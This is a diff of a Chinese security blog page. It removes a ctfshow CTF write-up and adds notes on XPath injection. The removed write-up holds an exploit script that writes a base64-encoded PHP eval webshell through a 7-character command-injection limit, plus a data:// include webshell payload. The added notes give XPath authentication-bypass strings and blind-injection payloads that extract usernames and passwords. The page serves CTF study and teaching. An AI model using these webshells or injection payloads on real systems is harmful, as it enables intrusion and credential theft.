@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>ctfshow七夕杯wp | 甜筒园</title>
+  <title>Xpath笔记 | 甜筒园</title>
   <meta name="keywords" content="">
-  <meta name="description" content="ctfshow七夕杯wp | 甜筒园">
+  <meta name="description" content="Xpath笔记 | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="XPath注入一、语法选取节点   表达式 描述    nodename 选取此节点的所有子节点。   &#x2F; 从根节点选取（取子节点）。   &#x2F;&#x2F; 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置（取子孙节点）。   . 选取当前节点。   .. 选取当前节点的父节点。   @ 选取属性。   在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：">
 <meta property="og:type" content="article">
@@ -360,9 +360,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-ctfshow七夕杯wp" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-XPath注入" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">ctfshow七夕杯wp</h1>
+        <h1 class="article-title">Xpath笔记</h1>
     
     <div class="article-meta">
         
@@ -372,7 +372,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Writeup">Writeup</a>
+            <a  data-rel="笔记">笔记</a>
             
         </span>
         
@@ -380,12 +380,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-07 16:47:35'>2022-08-06 17:17</time>
+            Created At : <time class="date" title='Updated At: 2023-03-11 22:00:00'>2023-03-11 21:17</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:919</span>
+        <span>Count:1.4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -415,7 +415,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81WEB"><span class="toc-text">一、WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-web%E7%AD%BE%E5%88%B0"><span class="toc-text">1.web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-easy-calc"><span class="toc-text">2.easy_calc</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XPath%E6%B3%A8%E5%85%A5"><span class="toc-text">XPath注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%AF%AD%E6%B3%95"><span class="toc-text">一、语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E5%8F%96%E8%8A%82%E7%82%B9"><span class="toc-text">选取节点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%93%E8%AF%AD%EF%BC%88Predicates%EF%BC%89"><span class="toc-text">谓语（Predicates）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E5%8F%96%E6%9C%AA%E7%9F%A5%E8%8A%82%E7%82%B9"><span class="toc-text">选取未知节点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B3%A8%E5%85%A5"><span class="toc-text">二、注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-text">常规注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-text">盲注：</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -431,130 +431,298 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="一、WEB"><a href="#一、WEB" class="headerlink" title="一、WEB"></a>一、WEB</h2><h3 id="1-web签到"><a href="#1-web签到" class="headerlink" title="1.web签到"></a>1.web签到</h3><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/202208061433292.png"></p>
-<p>​    题目说明仅支持短命令执行且没有回显，先F12查看一下源码：</p>
-<pre><code class="js">function help()&#123;
-    if(isSafe($(&quot;#cmd&quot;).val()))&#123;
-        $(&quot;#help&quot;).css(&quot;color&quot;,&quot;#69cf56&quot;);
-        $(&quot;#help&quot;).html(&quot;提交命令执行&quot;);
-    &#125;else&#123;
-        $(&quot;#help&quot;).css(&quot;color&quot;,&quot;#ec1616&quot;);
-        $(&quot;#help&quot;).html(&quot;命令字符过长&quot;);
-        &#125;
-&#125;
-function isSafe(cmd)&#123;
-    return cmd.length&lt;=7;
-&#125;
-function check()&#123;
-    if(isSafe($(&quot;#cmd&quot;).val()))&#123;
-          $(&quot;#help&quot;).css(&quot;color&quot;,&quot;#69cf56&quot;);
-                   $(&quot;#help&quot;).html(&quot;提交命令执行&quot;);
-                   return true;
-     &#125;else&#123;
-         $(&quot;#help&quot;).css(&quot;color&quot;,&quot;#ec1616&quot;);
-         $(&quot;#help&quot;).html(&quot;命令字符过长&quot;);
-         return false ;
-        &#125;		
-&#125;
+        <h1 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h1><h2 id="一、语法"><a href="#一、语法" class="headerlink" title="一、语法"></a>一、语法</h2><h3 id="选取节点"><a href="#选取节点" class="headerlink" title="选取节点"></a>选取节点</h3><table>
+<thead>
+<tr>
+<th align="left">表达式</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">nodename</td>
+<td align="left">选取此节点的所有子节点。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;</td>
+<td align="left">从根节点选取（取子节点）。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;&#x2F;</td>
+<td align="left">从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置（取子孙节点）。</td>
+</tr>
+<tr>
+<td align="left">.</td>
+<td align="left">选取当前节点。</td>
+</tr>
+<tr>
+<td align="left">..</td>
+<td align="left">选取当前节点的父节点。</td>
+</tr>
+<tr>
+<td align="left">@</td>
+<td align="left">选取属性。</td>
+</tr>
+</tbody></table>
+<p>在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：</p>
+<table>
+<thead>
+<tr>
+<th align="left">路径表达式</th>
+<th align="left">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">bookstore</td>
+<td align="left">选取 bookstore 元素的所有子节点。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;bookstore</td>
+<td align="left">选取根元素 bookstore。注释：假如路径起始于正斜杠( &#x2F; )，则此路径始终代表到某元素的绝对路径！</td>
+</tr>
+<tr>
+<td align="left">bookstore&#x2F;book</td>
+<td align="left">选取属于 bookstore 的子元素的所有 book 元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;&#x2F;book</td>
+<td align="left">选取所有 book 子元素，而不管它们在文档中的位置。</td>
+</tr>
+<tr>
+<td align="left">bookstore&#x2F;&#x2F;book</td>
+<td align="left">选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;&#x2F;@lang</td>
+<td align="left">选取名为 lang 的所有属性。</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="谓语（Predicates）"><a href="#谓语（Predicates）" class="headerlink" title="谓语（Predicates）"></a>谓语（Predicates）</h3><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。</p>
+<p>谓语被嵌在方括号中。</p>
+<p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p>
+<table>
+<thead>
+<tr>
+<th align="left">路径表达式</th>
+<th align="left">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">&#x2F;bookstore&#x2F;book[1]</td>
+<td align="left">选取属于 bookstore 子元素的第一个 book 元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;bookstore&#x2F;book[last()]</td>
+<td align="left">选取属于 bookstore 子元素的最后一个 book 元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;bookstore&#x2F;book[last()-1]</td>
+<td align="left">选取属于 bookstore 子元素的倒数第二个 book 元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;bookstore&#x2F;book[position()&lt;3]</td>
+<td align="left">选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;&#x2F;title[@lang]</td>
+<td align="left">选取所有拥有名为 lang 的属性的 title 元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;&#x2F;title[@lang&#x3D;’eng’]</td>
+<td align="left">选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;bookstore&#x2F;book[price&gt;35.00]</td>
+<td align="left">选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;&#x2F;title</td>
+<td align="left">选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="选取未知节点"><a href="#选取未知节点" class="headerlink" title="选取未知节点"></a>选取未知节点</h3><p>XPath 通配符可用来选取未知的 XML 元素。</p>
+<table>
+<thead>
+<tr>
+<th align="left">通配符</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">*</td>
+<td align="left">匹配任何元素节点。</td>
+</tr>
+<tr>
+<td align="left">@*</td>
+<td align="left">匹配任何属性节点。</td>
+</tr>
+<tr>
+<td align="left">node()</td>
+<td align="left">匹配任何类型的节点。</td>
+</tr>
+</tbody></table>
+<p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p>
+<table>
+<thead>
+<tr>
+<th align="left">路径表达式</th>
+<th align="right">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">&#x2F;bookstore&#x2F;*</td>
+<td align="right">选取 bookstore 元素的所有子元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;&#x2F;*</td>
+<td align="right">选取文档中的所有元素。</td>
+</tr>
+<tr>
+<td align="left">&#x2F;&#x2F;title[@*]</td>
+<td align="right">选取所有带有属性的 title 元素。</td>
+</tr>
+</tbody></table>
+<h2 id="二、注入"><a href="#二、注入" class="headerlink" title="二、注入"></a>二、注入</h2><h3 id="常规注入："><a href="#常规注入：" class="headerlink" title="常规注入："></a>常规注入：</h3><pre><code class="python">//原php代码中的查询语句
+
+
+
+$query=&quot;user/username[@name=&#39;&quot;.$user.&quot;&#39;]&quot;;
+
+
+
+//构造1：user1&#39; or 1=1 or &#39;&#39;=&#39;
+
+
+
+$query=&quot;user/username[@name=&#39;user1&#39; or 1=1 or &#39;&#39;=&#39;&#39;]&quot;;
+
+
+
+//构造2：&#39;]|//*|//*[&#39;
+
+
+
+$query=&quot;user/username[@name=&#39;user1&#39;]|//*|//*[&#39;&#39;]&quot;;
 </code></pre>
-<p>​        发现一段js代码，要求命令执行长度不超过7个字符。因为命令执行没有回显，我们可以利用写文件的方法在一个新的文件中进行getshell。首先确定我们文件中的内容：</p>
-<pre><code class="powershell">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php
+<h3 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h3><p>从根节点开始判断：</p>
+<pre><code class="csharp">&#39;or count(/)=1  or &#39;&#39;=&#39;     ###根节点数量为1
+
+
+
+&#39;or count(/*)=1 or &#39;&#39;=&#39;   ##根节点下只有一个子节点
 </code></pre>
-<p>​        通过echo指令向1.php这个文件中写入一句话木马<code>&lt;?php eval($_POST[1]);</code>,由于我们的命令执行长度最多为7个字符，所以我们得将文件中的内容分成若干段倒序新建文件，再利用<code>ls -t&gt;0</code>命令（刚好7个字符）将当前环境下的所有文件按时间顺序存进名为0的文件中，新添加的文件排在最前面（所以新建文件时候要倒序），这时候我们的0文件里面内容如下：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20220805165101782.png" alt="image-20220805165101782"></p>
-<p>这时候我们再执行<code>. 0</code>命令将0文件当作脚本执行，就成功把一句话木马写进1.php文件中了。</p>
-<p>最后附上脚本：</p>
-<pre><code class="python">import requests
-import time
-url = &#39;http://0964f440-c926-43bf-8fd8-bc8853f97e2b.challenge.ctf.show/api/&#39;
-#payload=.0 ls -t&gt;0 echo\\ PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==\\|base64\\ -d\\&gt;1.php
-payload=[    &quot;&gt;hp&quot;,
-             &quot;&gt;1.p\\&quot;,
-             &quot;&gt;d\\&gt;\\&quot;,
-             &quot;&gt;\\ -\\&quot;,
-             &quot;&gt;64\\&quot;,
-             &quot;&gt;ase\\&quot;,
-             &quot;&gt;\\|b\\&quot;,
-             &quot;&gt;Ow==\\&quot;,
-             &quot;&gt;MV0p\\&quot;,
-             &quot;&gt;U1Rb\\&quot;,
-             &quot;&gt;X1BP\\&quot;,
-             &quot;&gt;bCgk\\&quot;,
-             &quot;&gt;ZXZh\\&quot;,
-             &quot;&gt;aHAg\\&quot;,
-             &quot;&gt;PD9w\\&quot;,
-             &quot;&gt;o\\ \\&quot;,
-             &quot;&gt;ech\\&quot;,
-             &quot;ls -t&gt;0&quot;,
-             &quot;. 0&quot;]
-def write(pay):
-    data = &#123;
-        &quot;cmd&quot;: pay
-    &#125;
-    r=requests.post(url=url+&#39;tools.php&#39;, data=data)
-    r.encoding=&#39;utf-8&#39;
-    if &quot;执行&quot; in r.text:
-        print(f&#39;&#123;pay&#125;执行成功&#39;)
-def run():
-    for p in payload:
-        print(f&quot;正在执行&#123;p.strip()&#125;&quot;)
-        write(p.strip())
-        time.sleep(1)
-def getflag():
-    data=&#123;
-        &quot;1&quot;:&quot;system(&#39;cat /f*&#39;);&quot;
-    &#125;
-    r=requests.post(url=url+&#39;11.php&#39;,data=data)
-    print(r.text)
-if __name__ == &#39;__main__&#39; :
-    run()
-    getflag()
+<p>判断根节点下的节点长度为8：</p>
+<pre><code class="csharp">&#39;or string-length(name(/*[1]))=8 or &#39;&#39;=&#39;
 </code></pre>
-<p>注：需要注意对特殊符号的转义处理</p>
-<h3 id="2-easy-calc"><a href="#2-easy-calc" class="headerlink" title="2.easy_calc"></a>2.easy_calc</h3><p>​       题目直接给出源码：</p>
-<pre><code class="php">&lt;?php
+<p>猜解根节点下的节点名称：</p>
+<pre><code class="csharp">&#39;or substring(name(/*[1]), 1, 1)=&#39;a&#39;  or &#39;&#39;=&#39;
 
 
-if(check($code))&#123;
 
-    eval(&#39;$result=&#39;.&quot;$code&quot;.&quot;;&quot;);
-    echo($result);    
-&#125;
+&#39;or substring(name(/*[1]), 2, 1)=&#39;c&#39;  or &#39;&#39;=&#39;
 
-function check(&amp;$code)&#123;
 
-    $num1=$_POST[&#39;num1&#39;];
-    $symbol=$_POST[&#39;symbol&#39;];
-    $num2=$_POST[&#39;num2&#39;];
 
-    if(!isset($num1) || !isset($num2) || !isset($symbol) )&#123;
-        
-        return false;
-    &#125;
+..
 
-    if(preg_match(&quot;/!|@|#|\\$|\%|\^|\&amp;|\(|_|=|&#123;|&#39;|&lt;|&gt;|\?|\?|\||`|~|\[/&quot;, $num1.$num2.$symbol))&#123;
-        return false;
-    &#125;
 
-    if(preg_match(&quot;/^[\+\-\*\/]$/&quot;, $symbol))&#123;
-        $code = &quot;$num1$symbol$num2&quot;;
-        return true;
-    &#125;
 
-    return false;
-&#125;
-
+&#39;or substring(name(/*[1]), 8, 1)=&#39;s&#39;  or &#39;&#39;=&#39;
 </code></pre>
-<p>过滤了小括号，大部分函数都无法使用，首先想到几个不需要使用括号的文件包含函数：<code>include、require、require_once</code>，同时我们想获得回显就需要利用伪协议包含，这里我们利用<code>data://</code>伪协议，将一句话木马<code>&lt;?php eval($_POST[1])</code>;用base64编码绕过过滤，payload如下：</p>
-<pre><code class="php">POST 
-num1=1;include&quot;data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&quot;;1&amp;symbol=-&amp;num2=1&amp;1=system(&#39;cat /s*&#39;);
+<p>猜解出该节点名称为accounts</p>
+<pre><code class="cobol">&#39;or count(/accounts)=1  or &#39;&#39;=&#39;   /accounts节点数量为1
+
+
+
+&#39;or count(/accounts/user/*)&gt;0 or &#39;&#39;=&#39;     /accounts下有两个节点
+
+
+
+ 
+
+
+
+&#39;or string-length(name(/accounts/*[1]))=4  or &#39;&#39;=&#39;    第一个子节点长度为4
 </code></pre>
-<p>还可以：</p>
-<pre><code class="php">POST 
-num1=1;include&quot;data:/&amp;symbol=/&amp;num2=text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&quot;&amp;1=system(&#39;cat /s*&#39;);
+<p>猜解accounts下的节点名称：</p>
+<pre><code class="python">&#39;or substring(name(/accounts/*[1]), 1, 1)=&#39;u&#39;  or &#39;&#39;=&#39;
+
+
+
+...
+
+
+
+&#39;or substring(name(/accounts/*[1]), 4, 1)=&#39;r&#39;  or &#39;&#39;=&#39;
 </code></pre>
-<p>注：①等于号被过滤了，base64编码后的结果中要把等于号去掉不影响解码结果；</p>
-<p>​        ②flag在secret文件中</p>
+<p>accounts下子节点名称为user</p>
+<pre><code class="sql">&#39;or count(/accounts/user)=2  or &#39;&#39;=&#39;    user节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为user节点
+</code></pre>
+<p>第一个user节点的子节点长度为8：<br>‘or string-length(name(&#x2F;accounts&#x2F;user[position()&#x3D;1]&#x2F;*[1]))&#x3D;8 or ‘’&#x3D;’</p>
+<p>读取user节点的下子节点</p>
+<pre><code class="python">&#39;or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)=&#39;u&#39;  or &#39;&#39;=&#39;
+
+
+
+&#39;or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)=&#39;s&#39;  or &#39;&#39;=&#39;
+
+
+
+...
+
+
+
+&#39;or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)=&#39;e&#39;  or &#39;&#39;=&#39;
+</code></pre>
+<p>最终所有子节点值验证如下：</p>
+<pre><code class="csharp">&#39;or substring(name(/accounts/user[position()=1]/*[1]), 1)=&#39;username&#39;  or &#39;&#39;=&#39;
+
+
+
+&#39;or substring(name(/accounts/user[position()=1]/*[2]), 1)=&#39;email&#39;  or &#39;&#39;=&#39;
+
+
+
+&#39;or substring(name(/accounts/user[position()=1]/*[3]), 1)=&#39;accounttype&#39;  or &#39;&#39;=&#39;
+
+
+
+&#39;or substring(name(/accounts/user[position()=1]/*[4]), 1)=&#39;password&#39;  or &#39;&#39;=&#39;
+</code></pre>
+<p>继续猜解：</p>
+<pre><code class="csharp">&#39;or count(/accounts/user[position()=1]/username/*)&gt;0 or &#39;&#39;=&#39;   
+
+
+
+&#39;or count(/accounts/user[position()=1]/email/*)&gt;0 or &#39;&#39;=&#39; 
+
+
+
+&#39;or count(/accounts/user[position()=1]/accounttype/*)&gt;0 or &#39;&#39;=&#39;
+
+
+
+&#39;or count(/accounts/user[position()=1]/username/password/*)&gt;0 or &#39;&#39;=&#39;
+</code></pre>
+<p>均为 false，不再有子节点，则可以尝试读取这些节点的值</p>
+<p>第一个user下的username值长度为6:</p>
+<pre><code class="csharp">&#39;or string-length((//user[position()=1]/username[position()=1]))=6  or &#39;&#39;=&#39;
+</code></pre>
+<p>读取第一个user下usernaem的值</p>
+<pre><code class="csharp">&#39;or substring((//user[position()=1]/username[position()=1]),1,1)=&#39;T&#39;  or &#39;&#39;=&#39;
+
+
+
+....
+
+
+
+&#39;or substring((//user[position()=1]/username[position()=1]),6,1)=&#39;e&#39;  or &#39;&#39;=&#39;
+</code></pre>
+<p>可依次读取所有的子节点的值，第二user节点的子节点值读取方式：</p>
+<pre><code class="sql">&#39;or string-length((//user[position()=2]/username[position()=1]))=4 or &#39;&#39;=&#39;  第一个user下的username长度为4
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
